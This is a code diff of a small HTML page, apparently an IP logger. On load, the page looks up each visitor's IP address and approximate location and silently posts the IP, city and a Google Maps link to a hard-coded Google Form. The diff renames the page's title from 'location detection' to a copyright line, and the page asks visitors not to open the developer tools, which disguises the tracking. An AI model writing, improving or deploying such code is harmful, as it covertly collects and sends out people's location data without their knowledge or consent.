@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Deteksi Lokasi</title>
+    <title>© 2025 SDBS Studio Development</title>
     <style>
       body {
         font-family: "Segoe UI", sans-serif;
@@ -40,36 +40,49 @@
     </div>
 
     <script>
-      fetch("https://ip-api.com/json")
+      fetch("https://api64.ipify.org?format=json")
         .then((res) => res.json())
         .then((data) => {
-          const lat = data.lat;
-          const lon = data.lon;
-          const ip = data.query;
-          const city = data.city;
-          const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;
+          const ip = data.ip;
 
-          // Kirim ke Google Form (opsional)
-          const formURL =
-            "https://docs.google.com/forms/d/e/1FAIpQLSfP4SzXDpbenObZjUGxGOnB2gcXRsAXjMFTOvrfTaTczE74eA/formResponse";
-          const formData = new FormData();
-          formData.append("entry.279686887", ip);
-          formData.append("entry.916346022", city);
-          formData.append("entry.911657502", mapsURL);
+          // Ambil lokasi berdasarkan IP dari ipapi.co
+          fetch(`https://ipapi.co/${ip}/json/`)
+            .then((res) => res.json())
+            .then((locData) => {
+              const city = locData.city || "Unknown";
+              const lat = locData.latitude;
+              const lon = locData.longitude;
+              const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          fetch(formURL, {
-            method: "POST",
-            mode: "no-cors",
-            body: formData,
-          });
+              // Kirim ke Google Form (opsional)
+              const formURL =
+                "https://docs.google.com/forms/d/e/1FAIpQLSfP4SzXDpbenObZjUGxGOnB2gcXRsAXjMFTOvrfTaTczE74eA/formResponse";
+              const formData = new FormData();
+              formData.append("entry.279686887", ip);
+              formData.append("entry.916346022", city);
+              formData.append("entry.911657502", mapsURL);
 
-          // Update konten
-          document.getElementById("info").innerHTML = `
-          <p>IP: ${ip}</p>
-          <p>City: ${city}</p> <br>
-          <p>Please do not open the developer tools.</p>
-          <p>© 2025 SDBS Studio Development</p>
-        `;
+              fetch(formURL, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData,
+              });
+
+              // Update konten
+              document.getElementById("info").innerHTML = `
+                <p>IP: ${ip}</p>
+                <p>City: ${city}</p> <br>
+                <p>Please do not open the developer tools.</p>
+                <p>© 2025 SDBS Studio Development</p>
+              `;
+            })
+            .catch(() => {
+              document.getElementById("info").innerHTML = `
+                <p>IP: ${ip}</p>
+                <p>City: Gagal mengambil lokasi</p>
+                <p>Silakan periksa koneksi atau coba lagi nanti.</p>
+              `;
+            });
         });
     </script>
   </body>
